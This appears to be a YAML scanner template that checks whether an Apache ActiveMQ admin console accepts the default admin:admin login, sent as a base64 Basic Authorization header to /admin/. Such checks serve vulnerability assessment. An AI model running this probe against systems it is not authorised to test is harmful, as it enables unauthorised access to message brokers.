detail:
  author: pa55w0rd(www.pa55w0rd.online/)
  links:
  - https://blog.csdn.net/ge00111/article/details/72765210
expression: r0() && r1()
manual: true
name: poc-yaml-activemq-default-password
rules:
  r0:
    expression: response.status == 401 && response.body.bcontains(b"Unauthorized")
    request:
      cache: true
      method: GET
      path: /admin/
  r1:
    expression: response.status == 200 && response.body.bcontains(b"Welcome to the
      Apache ActiveMQ Console of") && response.body.bcontains(b"<h2>Broker</h2>")
    request:
      cache: true
      headers:
        Authorization: Basic YWRtaW46YWRtaW4=
      method: GET
      path: /admin/
transport: http
